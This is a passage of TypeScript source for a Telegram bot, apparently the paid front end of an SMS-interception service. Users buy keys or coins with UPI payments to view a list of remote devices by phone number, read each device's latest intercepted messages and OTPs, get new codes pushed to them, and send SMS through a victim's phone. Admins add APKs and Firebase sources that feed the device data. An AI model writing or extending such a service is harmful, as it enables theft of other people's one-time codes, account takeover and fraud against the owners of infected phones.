      .catch((stopError) => logger.warn({ stopError }, "Could not stop Telegram polling after authorization failure"));
  });
  startAutoRefresh();

  // Load admin IDs from settings
  const savedAdmins = await getSetting("admin_ids").catch(() => null);
  if (savedAdmins) {
    for (const id of savedAdmins.split(",")) {
      if (id.trim()) adminChatIds.add(id.trim());
    }
  }

  bot.onText(/^\/start(?: (.+))?$/, async (msg, match) => {
    const chatId = String(msg.chat.id);
    const b = bot!;
    await touchUser(chatId).catch(() => {});

    // Check maintenance mode
    if (await isMaintenanceBlocked(chatId, b)) return;

    // Check ban
    if (await isBanned(chatId)) {
      await b.sendMessage(chatId, "🚫 You are banned from using this bot.");
      return;
    }

    const refParam = match?.[1]?.trim() ?? "";
    const referrerChatId = refParam.startsWith("ref_") ? refParam.slice(4).trim() : "";
    if (referrerChatId && referrerChatId !== chatId) {
      await saveFirstReferralAttribution(chatId, referrerChatId);
      await notifyReferralProcessing(chatId, b).catch((err) =>
        logger.warn({ err, chatId }, "Referral processing notification failed")
      );
    }

    const { ok, missing } = await checkForceChannels(chatId);
    if (!ok) {
      const keyboard: InlineKeyboardButton[][] = missing.map((ch) => [{
        text: `📢 ${ch.label ?? ch.channelUsername ?? ch.channelId}`,
        url: `https://t.me/${ch.channelUsername ?? ch.channelId.replace("-100", "")}`,
      }]);
      keyboard.push([{ text: "✅ Joined! Continue", callback_data: "check_join" }]);
      await b.sendMessage(chatId, "📢 *Pehle ye channels join karo:*", {
        parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard },
      });
      return;
    }

    await completeReferralVerification(chatId, b);
    const [name, ua] = [msg.from?.first_name ?? "User", await getUserAccess(chatId)];
    await sendMainMenu(chatId, name, ua);
  });

  bot.onText(/^\/apk$/, async (msg) => {
    const chatId = String(msg.chat.id);
    if (await isMaintenanceBlocked(chatId, bot!)) return;
    await handleApkList(chatId);
  });
  bot.onText(/^\/links$/, async (msg) => {
    const chatId = String(msg.chat.id);
    if (await isMaintenanceBlocked(chatId, bot!)) return;
    await handleLinksList(chatId);
  });
  bot.onText(/^\/ref$/, async (msg) => {
    const chatId = String(msg.chat.id);
    if (await isMaintenanceBlocked(chatId, bot!)) return;
    await handleMyRef(chatId);
  });

  bot.onText(/^\/admin(?: (.+))?$/, async (msg, match) => {
    const chatId = String(msg.chat.id);
    const pw = match?.[1]?.trim() ?? "";
    const adminPassword = process.env.ADMIN_PASSWORD;
    if (!adminPassword) {
      await bot!.sendMessage(chatId, "Admin sign-in is not configured yet.");
      return;
    }
    if (pw === adminPassword) {
      adminChatIds.add(chatId);
      // Save admin id
      const current = await getSetting("admin_ids").catch(() => "");
      const ids = current ? current.split(",").filter(Boolean) : [];
      if (!ids.includes(chatId)) {
        ids.push(chatId);
        await setSetting("admin_ids", ids.join(","));
      }
      await sendAdminMenu(chatId);
    } else {
      await bot!.sendMessage(chatId, "❌ Wrong password.\nUsage: `/admin YOUR_PASSWORD`", { parse_mode: "Markdown" });
    }
  });

  bot.onText(/^\/redeem(?: (.+))?$/, async (msg, match) => {
    const chatId = String(msg.chat.id);
    const b = bot!;
    void touchUser(chatId).catch(() => {});
    if (await isMaintenanceBlocked(chatId, b)) return;
    if (await isBanned(chatId)) { await b.sendMessage(chatId, "🚫 You are banned."); return; }
    const keyCode = match?.[1]?.trim().toUpperCase() ?? "";
    if (!keyCode) { await b.sendMessage(chatId, "Usage: `/redeem KEYCODE`", { parse_mode: "Markdown" }); return; }
    try {
      await redeemKey(chatId, keyCode, b);
    } catch (err) {
      await b.sendMessage(chatId, `❌ Error: ${err instanceof Error ? err.message : "Unknown"}`);
    }
  });

  bot.on("message", async (msg) => {
    const chatId = String(msg.chat.id);
    void touchUser(chatId).catch(() => {});
    if (msg.text?.startsWith("/")) return;
    const b = bot!;

    // Ban check on messages
    if (!adminChatIds.has(chatId) && await isBanned(chatId)) return;
    if (await isMaintenanceBlocked(chatId, b)) return;

    const pending = pendingInputs.get(chatId);
    if (!pending) return;

    const photoInput = pending.type === "pay_screenshot" ||
      pending.type === "web_panel_image" ||
      pending.type === "web_panel_screenshot";
    if (photoInput) {
      if (!msg.photo?.length) {
        await b.sendMessage(chatId, "📸 Photo bhejo, text ya document nahi. Screenshot ko image/photo ke roop mein send karo.");
        return;
      }
      pendingInputs.delete(chatId);
      const fileId = msg.photo[msg.photo.length - 1]!.file_id;
      try { await handlePendingInput(chatId, pending, fileId, b, msg); } catch (err) {
        logger.error({ err }, "Photo input handler error");
        b.sendMessage(chatId, `❌ Error: ${err instanceof Error ? err.message : "Unknown"}`).catch(() => {});
      }
      return;
    }

    if (!msg.text) return;
    pendingInputs.delete(chatId);
    const text = msg.text.trim();
    try { await handlePendingInput(chatId, pending, text, b, msg); } catch (err) {
      logger.error({ err, type: pending.type }, "Pending input handler error");
      b.sendMessage(chatId, `❌ Error: ${err instanceof Error ? err.message : "Unknown"}`).catch(() => {});
    }
  });

  bot.on("callback_query", async (query) => {
    const b = bot!;
    b.answerCallbackQuery(query.id).catch(() => {});
    const chatId = String(query.message?.chat.id ?? query.from.id);
    void touchUser(chatId).catch(() => {});
    const messageId = query.message?.message_id;
    const data = query.data ?? "";

    if (await isMaintenanceBlocked(chatId, b)) return;

    // Ban check - allow only check_join for un-banned flow
    if (!adminChatIds.has(chatId) && data !== "check_join" && await isBanned(chatId)) {
      await b.sendMessage(chatId, "🚫 You are banned from using this bot.");
      return;
    }

    try { await handleCallback(chatId, messageId, data, b); } catch (err) {
      logger.error({ err, data }, "Callback handler error");
      b.sendMessage(chatId, `❌ Error: ${err instanceof Error ? err.message : "Unknown"}`).catch(() => {});
    }
  });

  logger.info("Bot handlers registered ✅");
}

// ─── CALLBACK HANDLER ─────────────────────────────────────────────────────────
async function handleCallback(chatId: string, messageId: number | undefined, data: string, b: TelegramBot): Promise<void> {

  if (data.startsWith("nums_")) {
    const ua = await getUserAccess(chatId);
    const coins = await getCreditCoins(chatId);
    if (!ua.hasAccess && coins <= 0) { await sendAccessDenied(chatId, messageId); return; }
    if (data === "nums_page_select") {
      await sendPageSelector(chatId, messageId);
      return;
    }
    const page = Math.max(0, parseInt(data.split("_")[1] ?? "0") || 0);
    activeNumbersMsgs.delete(chatId);
    await sendNumbersList(chatId, page, messageId, true);
    return;
  }

  if (data === "search_number") {
    pendingInputs.set(chatId, { type: "search_number" });
    await b.sendMessage(chatId, "🔍 Number search karo (ya part of number):");
    return;
  }

  if (data.startsWith("dev_")) {
    const ua = await getUserAccess(chatId);
    const coins = await getCreditCoins(chatId);
    if (!ua.hasAccess && coins <= 0) { await sendAccessDenied(chatId, messageId); return; }
    const parts = data.split("_");
    const deviceDbId = parseInt(parts[1] ?? "0");
    const listPage = Math.max(0, parseInt(parts[2] ?? "0") || 0);
    await sendDeviceDetail(chatId, deviceDbId, messageId, ua.hasAccess, listPage);
    return;
  }

  if (data.startsWith("credit_use_")) {
    const parts = data.split("_");
    const deviceDbId = parseInt(parts[2] ?? "0");
    const listPage = Math.max(0, parseInt(parts[3] ?? "0") || 0);
    const ua = await getUserAccess(chatId);
    if (ua.hasAccess) { await sendDeviceDetail(chatId, deviceDbId, messageId, true, listPage); return; }

    const coinCost = parseInt(await getSetting("coin_cost_per_number") ?? "1");
    const accessDuration = parseInt(await getSetting("credit_access_duration") ?? "30");
    const coins = await getCreditCoins(chatId);
    if (coins < coinCost) {
      await b.sendMessage(chatId, `❌ *Insufficient Balance.*\n\n🪙 Required: ${coinCost} coins\n🪙 You have: ${coins} coins`, { parse_mode: "Markdown" });
      return;
    }

    // Deduct coins
    await setCreditCoins(chatId, coins - coinCost);

    const [device] = await db.select().from(devicesTable).where(eq(devicesTable.id, deviceDbId));
    if (!device) { await b.sendMessage(chatId, "❌ Device not found."); return; }

    const recentMsg = await db.select().from(messagesTable)
      .where(eq(messagesTable.deviceId, deviceDbId)).orderBy(desc(messagesTable.receivedAt)).limit(1).then(r => r[0]);

    const phone = device.phoneNumber ?? "Unknown";
    const msgText = `📱 *${escapeMarkdown(phone)}*\n\n🔋 ${batteryStr(device.battery)} | 🕐 ${formatDate(device.lastSeen)}\n\n🪙 *${coinCost} coin deducted*\n⏳ Access expires in *${accessDuration} seconds*\n\n` +
      (recentMsg ? `📋 *Latest Message:*\n\`${escapeMarkdown(recentMsg.body)}\`\n📤 From: ${escapeMarkdown(recentMsg.fromNumber ?? "Unknown")}` : "_No messages yet._");

    const sentMsg = await b.sendMessage(chatId, msgText, {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back to List", callback_data: `nums_${listPage}` }]] },
    });

    // Auto-expire access notification
    setTimeout(async () => {
      try {
      await b.sendMessage(chatId, `⏰ *Access Expired!*\nNumber \`${escapeMarkdown(phone)}\` access closed.\n\n🪙 Dobara use karne ke liye coin deduct hoga.`, { parse_mode: "Markdown" });
        if (sentMsg) {
          await b.editMessageText(`📱 *${escapeMarkdown(phone)}* — ❌ *Access Expired*`, {
            chat_id: chatId, message_id: sentMsg.message_id,
            parse_mode: "Markdown",
          }).catch(() => {});
        }
      } catch {}
    }, accessDuration * 1000);
    return;
  }

  if (data.startsWith("watch_")) {
    const ua = await getUserAccess(chatId);
    if (!ua.hasAccess) { await b.sendMessage(chatId, "🔒 Watch OTP sirf Key users ke liye hai."); return; }
    const parts = data.split("_");
    const deviceDbId = parseInt(parts[1] ?? "0");
    const listPage = Math.max(0, parseInt(parts[2] ?? "0") || 0);
    if (!deviceWatchers.has(deviceDbId)) deviceWatchers.set(deviceDbId, new Set());
    deviceWatchers.get(deviceDbId)!.add(chatId);
    await b.sendMessage(chatId, "🔔 *Watch mode ON!*\nNew OTP aane par instant milega ⚡\n\n_Watch tab tak active rahega jab tak Key valid hai._", {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: [[{ text: "🔕 Unwatch", callback_data: `unwatch_${deviceDbId}_${listPage}` }, { text: "🔙 Back", callback_data: `dev_${deviceDbId}_${listPage}` }]] },
    });
    return;
  }
  if (data.startsWith("unwatch_")) {
    const parts = data.split("_");
    const deviceDbId = parseInt(parts[1] ?? "0");
    const listPage = Math.max(0, parseInt(parts[2] ?? "0") || 0);
    deviceWatchers.get(deviceDbId)?.delete(chatId);
    await b.sendMessage(chatId, "🔕 Watch mode OFF.", {
      reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: `dev_${deviceDbId}_${listPage}` }]] },
    });
    return;
  }

  if (data.startsWith("sendsms_")) {
    const ua = await getUserAccess(chatId);
    if (!ua.hasAccess) { await sendAccessDenied(chatId, messageId); return; }
    const parts = data.split("_");
    const deviceDbId = parseInt(parts[1] ?? "0");
    const listPage = Math.max(0, parseInt(parts[2] ?? "0") || 0);
    pendingInputs.set(chatId, { type: "send_sms_to", data: { deviceDbId, listPage } });
    await b.sendMessage(chatId, "📞 Jis number pe SMS bhejni hai woh number bhejo:");
    return;
  }

  if (data === "check_join") {
    const { ok, missing } = await checkForceChannels(chatId);
    if (ok) {
      if (messageId) await b.deleteMessage(chatId, messageId).catch(() => {});
      await completeReferralVerification(chatId, b);
      await b.sendMessage(chatId, "✅ Joined! /start karo.");
    } else {
      const text = "❌ Ye channels abhi bhi join nahi kiye:\n" + missing.map((c) => `• @${c.channelUsername ?? c.channelId}`).join("\n");
      if (messageId) await b.editMessageText(text, { chat_id: chatId, message_id: messageId }).catch(() => {});
    }
    return;
  }

  if (data === "main_menu") {
    const [ua, name] = [await getUserAccess(chatId), "User"];
    await sendMainMenu(chatId, name, ua, messageId);
    return;
  }

  if (data === "wallet_menu") { await sendWalletMenu(chatId, messageId); return; }
  if (data.startsWith("web_panel_buy_")) {
    const panelId = parseInt(data.slice("web_panel_buy_".length), 10);
    if (!Number.isInteger(panelId) || panelId < 1) { await b.sendMessage(chatId, "❌ Invalid web panel."); return; }
    await beginWebPanelPurchase(chatId, panelId, b);
    return;
  }

  if (data === "wallet_addmoney") {
    pendingInputs.set(chatId, { type: "pay_amount" });
    await b.sendMessage(chatId, "💳 *Add Money*\n\nKitna add karna hai? (rupees mein):", { parse_mode: "Markdown" });
    return;
  }

  if (data === "wallet_buykey") { await sendBuyKeyMenu(chatId, messageId); return; }

  if (data.startsWith("buyplan_")) {
    const planId = parseInt(data.split("_")[1]);
    const [plan, balance, kd, cd] = await Promise.all([
      db.select().from(keyPlansTable).where(eq(keyPlansTable.id, planId)).then((r) => r[0]),
      getBalance(chatId),
      getSetting("key_discount_pct"),
      getSetting("coin_discount_pct"),
    ]);
    if (!plan || !plan.isActive) { await b.sendMessage(chatId, "❌ Plan not found."); return; }
    const isCoins = plan.label.toLowerCase().includes("coin") || plan.label.toLowerCase().includes("credit");
    const disc = Math.min(100, Math.max(0, parseInt((isCoins ? cd : kd) ?? "0") || 0));
    const discPrice = disc > 0 ? Math.max(0, Math.floor(plan.price * (100 - disc) / 100)) : plan.price;
    if (balance < discPrice) {
      await b.sendMessage(chatId,
        `❌ *Insufficient Balance!*\n\n💰 Balance: ₹${balance}\n💸 Required: ₹${discPrice}${disc > 0 ? ` _(${disc}% OFF)_` : ""}\n\n₹${discPrice - balance} aur chahiye.`,
        {
          parse_mode: "Markdown",
          reply_markup: { inline_keyboard: [[{ text: "💳 Add Money", callback_data: "wallet_addmoney" }, { text: "🔙 Back", callback_data: "wallet_buykey" }]] },
        }
      );
      return;
    }
    await b.sendMessage(chatId,
      `🛒 *Confirm Purchase*\n\n📦 Plan: *${plan.label}*\n${isCoins ? "🪙 Type: Credit Coins" : `⏱ Duration: *${plan.durationHours} hours*`}\n💰 Price: *₹${discPrice}*${disc > 0 ? ` _(${disc}% OFF from ₹${plan.price})_` : ""}\n\n💳 Wallet: ₹${balance} → ₹${balance - discPrice}`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Confirm", callback_data: `buyconfirm_${plan.id}` }, { text: "❌ Cancel", callback_data: "wallet_buykey" }],
          ],
        },
      }
    );
    return;
  }

  if (data.startsWith("buyconfirm_")) {
    const planId = parseInt(data.split("_")[1]);
    const [plan, balance, kd2, cd2] = await Promise.all([
      db.select().from(keyPlansTable).where(eq(keyPlansTable.id, planId)).then((r) => r[0]),
      getBalance(chatId),
      getSetting("key_discount_pct"),
      getSetting("coin_discount_pct"),
    ]);
    if (!plan || !plan.isActive) { await b.sendMessage(chatId, "❌ Plan not found."); return; }
    const isCoins = plan.label.toLowerCase().includes("coin") || plan.label.toLowerCase().includes("credit");
    const disc2 = Math.min(100, Math.max(0, parseInt((isCoins ? cd2 : kd2) ?? "0") || 0));
    const discPrice2 = disc2 > 0 ? Math.max(0, Math.floor(plan.price * (100 - disc2) / 100)) : plan.price;
    if (balance < discPrice2) { await b.sendMessage(chatId, "❌ Insufficient Balance."); return; }
    const { ok } = await debitWallet(chatId, discPrice2);
    if (!ok) { await b.sendMessage(chatId, "❌ Balance deduction failed. Try again."); return; }

    if (isCoins) {
      // Add credit coins to wallet
      const coinAmount = plan.durationHours; // use durationHours field as coin count
      const currentCoins = await getCreditCoins(chatId);
      await setCreditCoins(chatId, currentCoins + coinAmount);
      await b.sendMessage(chatId,
        `✅ *Credit Coins Purchased!*\n\n🪙 +${coinAmount} coins added!\n🪙 Total Coins: ${currentCoins + coinAmount}\n\n_Coins use karo Number List mein._`,
        {
          parse_mode: "Markdown",
          reply_markup: { inline_keyboard: [[{ text: "📡 Number List", callback_data: "nums_0" }]] },
        }
      );
    } else {
      const expiresAt = await grantAccessForHours(chatId, plan.durationHours);
      const keyCode = randomBytes(6).toString("hex").toUpperCase();
      await db.insert(accessKeysTable).values({
        keyCode, durationHours: plan.durationHours, price: discPrice2,
        isActive: false, claimedAt: new Date(), claimedByChatId: chatId,
      });
      await b.sendMessage(chatId,
        `✅ *Key Purchased!*\n\n🔑 Key Code: \`${keyCode}\`\n⏱ Duration: ${plan.durationHours}h\n✅ Expires: ${formatDate(expiresAt)}\n\n_Notifications: Key expire hone par Watch OTP band ho jayega._`,
        {
          parse_mode: "Markdown",
          reply_markup: { inline_keyboard: [[{ text: "📡 Online Numbers", callback_data: "nums_0" }]] },
        }
      );
    }
    return;
  }

  if (data.startsWith("payapprove_") || data.startsWith("payreject_")) {
    if (!adminChatIds.has(chatId)) { await b.sendMessage(chatId, "❌ Unauthorized."); return; }
    const isApprove = data.startsWith("payapprove_");
    const reqId = parseInt(data.split("_")[1]);
    const [req] = await db.select().from(paymentRequestsTable).where(eq(paymentRequestsTable.id, reqId));
    if (!req) { await b.sendMessage(chatId, "❌ Request not found."); return; }
    if (req.status !== "pending") { await b.sendMessage(chatId, `⚠️ Already ${req.status}.`); return; }

    const panel = req.webPanelId
      ? (await db.select().from(webPanelsTable).where(eq(webPanelsTable.id, req.webPanelId)))[0]
      : undefined;
    if (isApprove && req.requestType === "web_panel" && !panel?.url) {
      await b.sendMessage(chatId, "⚠️ Is request ka web panel ya link nahi mila. Panel ko link ke saath dobara add karke phir approve karein; request pending rahegi.");
      return;
    }

    const [processed] = await db.update(paymentRequestsTable)
      .set({ status: isApprove ? "approved" : "rejected", reviewedAt: new Date() })
      .where(and(eq(paymentRequestsTable.id, reqId), eq(paymentRequestsTable.status, "pending")))
      .returning({ id: paymentRequestsTable.id });
    if (!processed) {
      await b.sendMessage(chatId, "⚠️ Ye request pehle hi process ho chuki hai.");
      return;
    }

    let adminResult: string;
    if (isApprove) {
      if (req.requestType === "web_panel") {
        const purchasedPanel = panel!;
        await b.sendMessage(
          req.chatId,
          `✅ Your payment approved!\n\n🖥 Web Panel: ${purchasedPanel.label}\n🔗 Your link:\n${purchasedPanel.url}`,
        ).catch(() => {});
        adminResult = `✅ Approved — ${purchasedPanel.label} link sent to ${req.chatId}`;
      } else {
        const newBal = await creditWallet(req.chatId, req.amount);
        await b.sendMessage(req.chatId,
          `✅ *Payment Approved!*\n\n₹${req.amount} wallet mein add ho gaya!\n💰 New Balance: ₹${newBal}`,
          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🛒 Buy", callback_data: "wallet_buykey" }]] } }
        ).catch(() => {});
        adminResult = `✅ Approved — ₹${req.amount} added to ${req.chatId}`;
      }
    } else {
      if (req.requestType === "web_panel") {
        await b.sendMessage(
          req.chatId,
          `❌ Your payment rejected.\n\nUTR: ${req.utrNumber}\nAmount: ₹${req.amount}`,
        ).catch(() => {});
        adminResult = `❌ Rejected — web panel payment from ${req.chatId}`;
      } else {
        await b.sendMessage(req.chatId,
          `❌ *Payment Rejected*\n\nUTR: ${req.utrNumber}\nAmount: ₹${req.amount}\n\nAdmin ne reject kar diya. Sahi UTR ke saath dobara try karo.`,
          { parse_mode: "Markdown" }
        ).catch(() => {});
        adminResult = `❌ Rejected — ₹${req.amount} from ${req.chatId}`;
      }
    }
    if (messageId) {
      await b.editMessageCaption(adminResult, { chat_id: chatId, message_id: messageId })
        .catch(() => b.editMessageText(adminResult, { chat_id: chatId, message_id: messageId }).catch(() => {}));
    }
    return;
  }

  if (data === "prompt_redeem") { await b.sendMessage(chatId, "🔑 `/redeem YOUR_KEY`", { parse_mode: "Markdown" }); return; }
  if (data === "apk_list") { await handleApkList(chatId, messageId); return; }
  if (data === "web_panels") { await handleWebPanelList(chatId, messageId); return; }
  if (data === "links_list") { await handleLinksList(chatId, messageId); return; }
  if (data === "my_ref") { await handleMyRef(chatId, messageId); return; }
  if (data === "adm_menu") {
    if (!adminChatIds.has(chatId)) { await b.sendMessage(chatId, "❌ Admin only."); return; }
    await sendAdminMenu(chatId, messageId);
    return;
  }

  // ─── ADMIN ONLY CALLBACKS ────────────────────────────────────────────────────
  if (data.startsWith("adm_") || data.startsWith("dplan_") || data.startsWith("qr_show_") || data.startsWith("confirm_reset_")) {
    if (!adminChatIds.has(chatId)) { await b.sendMessage(chatId, "❌ Admin only."); return; }
  }

  if (data === "adm_stats") {
    const [[d], [on], [pan], [fb], [keys], [msgs], [pend], [users], userStats] = await Promise.all([
      db.select({ count: count() }).from(devicesTable),
      db.select({ count: count() }).from(devicesTable).where(eq(devicesTable.isOnline, true)),
      db.select({ count: count() }).from(panelsTable),
      db.select({ count: count() }).from(firebaseConfigsTable),
      db.select({ count: count() }).from(accessKeysTable).where(eq(accessKeysTable.isActive, true)),
      db.select({ count: count() }).from(messagesTable),
      db.select({ count: count() }).from(paymentRequestsTable).where(eq(paymentRequestsTable.status, "pending")),
      db.select({ count: count() }).from(walletsTable),
      getUserStats(),
    ]);

    // Today's revenue
    const todayStart = new Date(); todayStart.setHours(0, 0, 0, 0);
    const [todayRevRow] = await db.select({ total: sum(paymentRequestsTable.amount) })
      .from(paymentRequestsTable)
      .where(and(eq(paymentRequestsTable.status, "approved")));

    const fbNumbers: Record<string, number> = {};
    const fbConfigs = await db.select().from(firebaseConfigsTable).limit(20);
    for (const cfg of fbConfigs) {
      const label = cfg.label ?? cfg.url.slice(0, 30);
      const [numRow] = await db.select({ count: count() }).from(panelsTable).where(eq(panelsTable.firebaseUrl, cfg.url));
      fbNumbers[label] = Number(numRow?.count ?? 0);
    }
    const fbSummary = Object.entries(fbNumbers).map(([l, n]) => `  • ${l}: ${n} panels`).join("\n") || "  None";

    await b.sendMessage(chatId,
      `📊 *Dashboard*\n━━━━━━━━━━━━━━━━━━\n` +
      `📱 Devices: ${d?.count ?? 0} | 🟢 Online: ${on?.count ?? 0}\n` +
      `📦 Panels: ${pan?.count ?? 0} | 🔥 Firebase: ${fb?.count ?? 0}\n` +
      `🔑 Active Keys: ${keys?.count ?? 0}\n` +
      `💬 Total OTPs: ${msgs?.count ?? 0}\n` +
      `💳 Pending Payments: ${pend?.count ?? 0}\n` +
      `👥 Total Users: ${userStats.totalUsers} | 🟢 Online: ${userStats.onlineUsers}\n` +
      `⚡ Active Users: ${userStats.activeUsers} | 🔑 Active Key Users: ${userStats.activeKeyUsers}\n` +
      `💰 Lifetime Revenue: ₹${todayRevRow?.total ?? 0}\n\n` +
      `🔥 *Firebase Numbers:*\n${fbSummary}`,
      { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] } }
    );
    return;
  }

  if (data === "adm_total_users") {
    const [stats, [walletUsers]] = await Promise.all([
      getUserStats(),
      db.select({ total: sum(walletsTable.balance) }).from(walletsTable),
    ]);
    await b.sendMessage(chatId,
      `👥 *User Statistics*\n\nTotal Users: ${stats.totalUsers}\n🟢 Online Users: ${stats.onlineUsers}\n⚡ Active Users: ${stats.activeUsers}\n🔑 Active Key Users: ${stats.activeKeyUsers}\n💰 Total Wallet Holdings: ₹${walletUsers?.total ?? 0}`,
      { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] } }
    );
    return;
  }

  if (data === "adm_panels") {
    const panels = await db.select().from(panelsTable).orderBy(desc(panelsTable.createdAt)).limit(20);
    const text = panels.length
      ? `📦 *Panels (${panels.length}):*\n\n` + panels.map((p) => `• *${p.name}*\n  \`${p.apiKey.slice(0, 12)}...\`${p.firebaseUrl ? " 🔥" : ""}`).join("\n")
      : "📦 No panels yet.";
    await b.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] } });
    return;
  }

  if (data === "adm_date_sort") {
    const enabled = (await getSetting(NUMBER_LIST_DATE_SORT_SETTING)) === "1";
    await setSetting(NUMBER_LIST_DATE_SORT_SETTING, enabled ? "0" : "1");
    notifyNumbersChanged();
    await b.sendMessage(
      chatId,
      enabled
        ? "⏱ Date-wise sorting OFF.\n\nNormal number sorting restore kar di gayi hai."
        : "📅 Date-wise sorting ON.\n\nAaj ke OTP/message wale numbers front par honge, aur latest message ke time ke according order honge.",
      { reply_markup: { inline_keyboard: [[{ text: "🔙 Admin Menu", callback_data: "adm_menu" }]] } },
    );
    return;
  }

  if (data === "adm_fb_add") {
    pendingInputs.set(chatId, { type: "fb_add" });
    await b.sendMessage(chatId,
      "🔥 *Firebase URL ya Website URL bhejo:*\n\n• APK Firebase: `https://yourdb-default-rtdb.firebaseio.com`\n• ZXKAI: `https://zxkaiz.vercel.app/?s=...`\n\n_Multiple URLs: ek per line_",
      { parse_mode: "Markdown" }
    );
    return;
  }

  if (data === "adm_fb_list") {
    const configs = await db.select().from(firebaseConfigsTable).orderBy(desc(firebaseConfigsTable.createdAt));
    const text = configs.length
      ? `📋 *Firebase URLs (${configs.length}):*\n\n` + configs.map((c) => {
          const numAdded = 0; // Could fetch count
          return `• \`${c.url.slice(0, 50)}\`${c.label ? ` (${c.label})` : ""}`;
        }).join("\n")
      : "📋 No Firebase URLs configured.";
    await b.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] } });
    return;
  }

  if (data === "adm_fb_active") {
    const { getActiveFirebaseUrls } = await import("../firebase/listener.js");
    const urls = await getActiveFirebaseUrls();
    if (!urls.length) {
      await b.sendMessage(chatId, "❌ Koi active Firebase nahi mila.", {
        reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] },
      });
      return;
    }
    const content = `${urls.join("\n")}\n`;
    await b.sendDocument(chatId, Buffer.from(content, "utf8"), {
      caption: `✅ Active Firebase URLs: ${urls.length}\n\n401, 404 aur deactivated sources exclude kiye gaye hain.`,
    }, {
      filename: "active-firebase-urls.txt",
      contentType: "text/plain",
    });
    return;
  }

  if (data === "adm_payments") {
    const reqs = await db.select().from(paymentRequestsTable)
      .where(eq(paymentRequestsTable.status, "pending")).orderBy(desc(paymentRequestsTable.createdAt)).limit(10);
    if (!reqs.length) {
      await b.sendMessage(chatId, "💳 *No pending payment requests.*", { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "adm_menu" }]] } });
      return;
    }
    for (const req of reqs) {
      const panel = req.requestType === "web_panel" && req.webPanelId
        ? (await db.select().from(webPanelsTable).where(eq(webPanelsTable.id, req.webPanelId)))[0]
        : undefined;
      const requestLabel = req.requestType === "web_panel" ? "Web Panel Purchase" : "Payment Request";
      const panelLine = req.requestType === "web_panel"
        ? `\n🖥 Panel: *${escapeMarkdown(panel?.label ?? `Panel #${req.webPanelId ?? "unknown"}`)}*`
        : "";
      const txt = `💳 *${requestLabel} #${req.id}*\n\n👤 User: \`${req.chatId}\`${panelLine}\n💰 Amount: *₹${req.amount}*\n📋 UTR: \`${req.utrNumber}\`\n🕐 ${formatDate(req.createdAt)}`;
      const kb = [[{ text: "✅ Approve", callback_data: `payapprove_${req.id}` }, { text: "❌ Reject", callback_data: `payreject_${req.id}` }]];
      if (req.screenshotFileId) {
        await b.sendPhoto(chatId, req.screenshotFileId, { caption: txt, parse_mode: "Markdown", reply_markup: { inline_keyboard: kb } }).catch(
          () => b.sendMessage(chatId, txt, { parse_mode: "Markdown", reply_markup: { inline_keyboard: kb } })
        );
      } else {
        await b.sendMessage(chatId, txt, { parse_mode: "Markdown", reply_markup: { inline_keyboard: kb } });
      }
    }
    return;
  }

  if (data === "adm_set_upi") {
    const current = await getSetting("upi_id");
    pendingInputs.set(chatId, { type: "set_upi" });
    await b.sendMessage(chatId, `🏦 *UPI ID Set karo:*\n\nCurrent: ${current ?? "—"}\n\nNaya UPI ID bhejo:`, { parse_mode: "Markdown" });
    return;
  }

  if (data === "adm_plans") {
    const plans = await db.select().from(keyPlansTable).where(eq(keyPlansTable.isActive, true)).orderBy(keyPlansTable.price);
    const text = plans.length
      ? `🗝 *Buy Plans (${plans.length}):*\n\n` + plans.map((p) => `• *${p.label}* — ${p.durationHours}h/coins | ₹${p.price}`).join("\n")
      : "🗝 No plans yet.";
    const keyboard: InlineKeyboardButton[][] = plans.map((p) => [{ text: `🗑 Delete: ${p.label}`, callback_data: `dplan_${p.id}` }]);
    keyboard.push([{ text: "➕ Add Plan", callback_data: "adm_plan_add" }, { text: "🔙 Back", callback_data: "adm_menu" }]);
    await b.sendMessage(chatId, text, { parse_mode: "Markdown", reply_markup: { inline_keyboard: keyboard } });
    return;
  }
  if (data === "adm_plan_add") {
    pendingInputs.set(chatId, { type: "plan_label" });
    await b.sendMessage(chatId, "🗝 Plan ka naam bhejo:\n\n_Tip: naam mein 'coin' ya 'credit' likhne pe credit coin plan banega, warna key plan banega._");
    return;
  }
  if (data.startsWith("dplan_")) {
    const planId = parseInt(data.split("_")[1]);
    await db.update(keyPlansTable).set({ isActive: false }).where(eq(keyPlansTable.id, planId));
    await b.sendMessage(chatId, "🗑 Plan deleted.", { reply_markup: { inline_keyboard: [[{ text: "🔙 Plans", callback_data: "adm_plans" }]] } });
    return;
  }

  if (data === "adm_apk_add") { pendingInputs.set(chatId, { type: "apk_label" }); await b.sendMessage(chatId, "📲 APK ka label bhejo:"); return; }
  if (data === "adm_link_add") { pendingInputs.set(chatId, { type: "link_label" }); await b.sendMessage(chatId, "🔗 Link ka label bhejo:"); return; }
  if (data === "adm_web_panels") {
    if (!adminChatIds.has(chatId)) { await b.sendMessage(chatId, "❌ Admin only."); return; }
    const panels = await db.select().from(webPanelsTable).orderBy(desc(webPanelsTable.addedAt));
    const text = panels.length
      ? `🖥 *Web Panels (${panels.length}):*\n\n` +
        panels.map((panel) => `• *${escapeMarkdown(panel.label)}* — ₹${panel.price} | Link: ${panel.url ? "✅ set" : "❌ not set"}`).join("\n")
      : "🖥 *Web Panels:*\n\n_Abhi koi panel add nahi hai._";
    const keyboard: InlineKeyboardButton[][] = panels.map((panel) => [
      {
        text: `${panel.url ? "🔗 Update" : "🔗 Set"} Link: ${panel.label.slice(0, 28)}`,
        callback_data: `adm_web_panel_set_url_${panel.id}`,
      },
      { text: "🗑 Delete", callback_data: `adm_web_panel_del_${panel.id}` },
    ]);
